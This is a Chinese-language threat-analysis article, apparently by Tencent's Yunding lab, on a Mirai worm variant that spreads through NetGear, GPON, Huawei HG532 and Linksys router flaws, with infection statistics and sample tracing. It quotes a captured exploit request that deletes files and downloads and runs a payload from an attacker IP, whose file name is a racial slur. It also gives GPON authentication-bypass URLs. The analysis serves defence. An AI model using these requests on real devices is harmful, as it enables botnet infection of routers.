# IoT 分析 | 路由器漏洞频发，Mirai 新变种来袭

阅读量 **230993**

发布时间 : 2018-11-27 11:41:20

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/dm/1024_823_/t010ce7f39d1c2dcaba.jpg)

## 一、前言

近期腾讯安全云鼎实验室听风威胁感知平台监测发现一款攻击路由器的蠕虫病毒，经过分析，认定此款蠕虫是 mirai 病毒的新变种，和之前的 mirai
病毒不同，该蠕虫不仅仅通过初代 mirai 使用的 telnent 爆破进行攻击，更多通过路由器漏洞进行攻击传播。

## 二、Payload 与漏洞分析

样本在传播和攻击过程中涉及到4个 PayLoad ，均针对路由器进行攻击，我们会对相关漏洞进行介绍，并针对传播情况利用抽样数据进行统计分析。  
表 PayLoad 情况：

![](https://p0.ssl.qhimg.com/t0182f2ae43aa07c294.jpg)

图 影响设备分布：

数据来源：腾讯安全云鼎实验室

上图是几款路由器漏洞影响的国家范围，中国、俄罗斯、日本和美国是受灾较为严重的国家。与国家发展程度、网络普及程度有一定关系，也与上述几款路由器的销售区域有着较强的关联。由于国产设备多，安全性不高等原因，我国未来
IoT 安全面临着巨大的挑战。

下面我们针对这四个漏洞分别进行介绍：

####  01 NetGear 路由器任意执行漏洞（CNNVD-201306-024）

1）漏洞分析：

POC 通过GET方法执行setup.cgi，通过todo命令执行syscmd，通过syscmd来执行下载和执行病毒的命令。

    
    
    GET/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.17.47.82/gvv+-O+/tmp/nigger;sh+nigger+netgear&curpath=/&currentsetting.htm=1 HTTP/1.1rnrn

代码如下：

A、执行setup.cgi后执行setup_main：

![](https://p0.ssl.qhimg.com/t01a3bbec2d0ae26bd7.png)

B、使用 GET 和 POST 方法都可以提交 POC：

![](https://p0.ssl.qhimg.com/t01d2817a1be926b716.png)

Todo参数后面直接调取相关的文件执行，没有做任何过滤，这里也是被利用的地方，直接调用syscmd来执行自己想要的命令。

![](https://p5.ssl.qhimg.com/t013ff113eebb636d4f.png)

2）传播情况：

图 NetGear DGN设备远程任意命令执行漏洞攻击数据抽样统计

![](https://p3.ssl.qhimg.com/t018668bab151b00729.png)

数据来源：腾讯安全云鼎实验室

发起 NetGear 漏洞攻击最多的地区是俄罗斯，可以推断带有NetGear 漏洞扫描的病毒载体感染量大。

####  02 GPON 光纤路由器命令执行漏洞（CVE-2018-10561/62）

1）漏洞分析：

设备上运行的HTTP服务器在进行身份验证时会检查特定路径，攻击者可以利用这一特性绕过任意终端上的身份验证。

通过在URL后添加特定参数 ?images/，最终获得访问权限：

    
    
    http://ip:port/menu.html?images/
    http://ip:port/GponForm/diag_FORM?images/

图 GPONPayLoad：

![](https://p1.ssl.qhimg.com/t016b893b36390fe932.png)

2）传播情况：

图 GPON设备远程任意命令执行漏洞攻击数据抽样统计

![](https://p5.ssl.qhimg.com/t01ca0fc2c2e7dd8f3b.png)

数据来源：腾讯安全云鼎实验室

此漏洞的病毒载体感染范围较大，对于中国、格鲁吉亚、埃及的影响最为广泛。中国美国的光纤发展迅速，埃及和格鲁吉亚受到中国影响，光纤发展速度也很快，也是他们受影响设备多的一个原因。

####  03 华为HG532系列路由器远程命令执行漏（CVE-2017-17215）

1）漏洞分析：

图 HG532 PayLoad

![](https://p1.ssl.qhimg.com/t011fcd1480a6fed978.png)

我们可以观察POC
首先提交一个身份认证信息，之后upgrade里面的NewStatusURL标签中执行了想要执行的命令。模块在upnp中，我们找到upnp模块，并找到NEwStatusURL标签，代码直接通过SYSTEM执行命令（upg
-g -u %s -t ‘Firmware Upgrade….’），没有做任何过滤。

![](https://p1.ssl.qhimg.com/t01868459cd8e194f94.png)

2）传播情况：

图 华为HG532设备远程命令执行漏洞攻击数据抽样统计

![](https://p4.ssl.qhimg.com/t0160bd6711241817cb.png)

数据来源：腾讯安全云鼎实验室

图 CVE-2017-17215 世界影响范围

![](https://p0.ssl.qhimg.com/t019b84c17814e23e3f.png)

数据来源：腾讯安全云鼎实验室

通过华为 HG532 设备远程命令执行的攻击统计，可以看出，利用此漏洞的病毒载体或扫描在中国、日本、俄罗斯非常活跃。

####  04 Linksys多款路由器 tmUnblock.cgi ttcp_ip 参数远程命令执行漏洞（CNVD-2014-01260）

1）漏洞分析：

多款Linksys路由器没有被正确过滤 ‘ttcp_ip’ 参数值，在 tmUnblock.cgi
脚本的实现上存在安全漏洞，经过身份验证的远程攻击者可利用此漏洞执行任意命令。受影响产品包括但不局限于：

E4200 E3200 E3000 E2500 E2100L E2000 E1550 E1500 E1200 E1000 E900 E300 WAG320N
WAP300N WAP610N WES610N WET610N WRT610N WRT600N WRT400N WRT320N WRT160N
WRT150N

![](https://p2.ssl.qhimg.com/t01eb3202d64ed72cd3.png)

2）传播情况：

图 Linksys 多款路由器设备远程命令执行漏洞攻击数据抽样统计

![](https://p0.ssl.qhimg.com/t0139a6bb4b687a7787.png)

数据来源：腾讯安全云鼎实验室

相关漏洞样本的下载地址很固定，基本分布于拉斯维加斯、新加坡、莫斯科和阿姆斯特丹这四个城市。经过黑产链条的团伙比对，针对路由器的黑产团伙服务器的配置位置，在这几个地方部署的量确实较大。

图 病毒服务器分布图

![](https://p2.ssl.qhimg.com/t017c116c4f9ae08b03.png)

数据来源：腾讯安全云鼎实验室

详细的服务器分布信息如下表所示：

表 捕获到的相关样本下载 IP 地址

![](https://p5.ssl.qhimg.com/t015fcf07c43336763a.jpg)

## 三、样本分析

样本md5：099b88bb74e9751abb4091ac4f1d690d

源地址统计（112.28.77.217）：13次，主要攻击了81、8080端口

下载IP：46.17.47.82

样本与mirai是同一个家族的样本，是mirai病毒的一个变种。代码结构和解密后的字符串均非常相似，不同的是此变种使用了3个路由器漏洞进行传播。

Mirai bot 代码的结构如下：

![](https://p5.ssl.qhimg.com/t010b0ca5ec8feb12ca.png)

包含了攻击模块、扫描模块和结束模块三个大模块，此样本代码结构与mirai一样，只是相比增加了三种针对路由器的扫描模块。

![](https://p1.ssl.qhimg.com/t0176509b5a7d63b6b3.png)

![](https://p0.ssl.qhimg.com/t01773f915f8ff80057.png)

与以前的mirai不同，这里检测/dev/watchdog，/dev/misc/watchdog，/dev/FTWDT101_watchdog，/dev/FTWDT101watchdog，/dev/FTWDT101/watchdog，/sbin/watchdog，/bin/watchdog，/dev/watchdog0，/etc/default/watchdog，/etc/watchdog
等来避免重启。

相比传统的mirai（/dev/watchdog，/dev/misc/watchdog）多了很多新的watchdog检测。同时包含了 Linux.Okiru
用来检测的路径（/dev/FTWDT101_watchdog，/dev/FTWDT101 watchdog）。

![](https://p1.ssl.qhimg.com/t01da5811b73d4909e4.png)

攻击服务器包含了很多相关的文件，各个操作系统平台上的，不同版本的文件。

![](https://p3.ssl.qhimg.com/t01268b7fd24ede9f21.png)

样本溯源：

下图 POC 中包含了相关的下载地址：

![](https://p3.ssl.qhimg.com/t01aac49b63a12c05e0.png)

通过访问链接 46.17.47.82/cutie，发现其中包含了真正的下载链接。

![](https://p4.ssl.qhimg.com/t0170e97f6ca4a16085.png)

保存的路径为：/tmp/gdf，/tmp/gxy，/tmp/dhf，/tmp/ttb;

再直接访问根目录，包含了一条 Twitter 地址：

![](https://p5.ssl.qhimg.com/t016f49619c6bc0d646.png)

该 Twitter的作者Philly是一个美国人，病毒存放的路径为nigr（Philly的自称），从Twitter中未发现直接与蠕虫相关的推文。

图 相关Twitter截图

![](https://p4.ssl.qhimg.com/t01223fdc905cd7f376.png)

关于样本捕获：

通过腾讯安全云鼎实验室听风威胁感知平台进行捕捉样本，听风威胁感知平台是云鼎实验室在全球多个节点部署的蜜罐网络集群，用于捕获真实的恶意流量，每天捕获数亿次的各类攻击请求。

相关捕捉界面如下：

![](https://p5.ssl.qhimg.com/t01f4a538354409a603.png)

## 参考文档：

<https://www.freebuf.com/vuls/171457.html>

<https://www.linuxidc.com/Linux/2014-02/97171.htm>

<https://xlab.tencent.com/cn/2018/01/05/a-new-way-to-exploit-cve-2017-17215/>

腾讯安全云鼎实验室
关注云主机与云内流量的安全研究和安全运营。利用机器学习与大数据技术实时监控并分析各类风险信息，帮助客户抵御高级可持续攻击；联合腾讯所有安全实验室进行安全漏洞的研究，确保云计算平台整体的安全性。相关能力通过腾讯云开放出来，为用户提供黑客入侵检测和漏洞风险预警等服务，帮助企业解决服务器安全问题。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **云鼎实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/166645](/post/id/166645)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [物联网](/tag/物联网)
  * [IoT](/tag/IoT)
  * [路由器](/tag/路由器)
  * [终端安全](/tag/终端安全)

 **+1** __6赞

 __收藏

![](https://p5.ssl.qhimg.com/t01b970aaa166cc3b7a.png) 云鼎实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

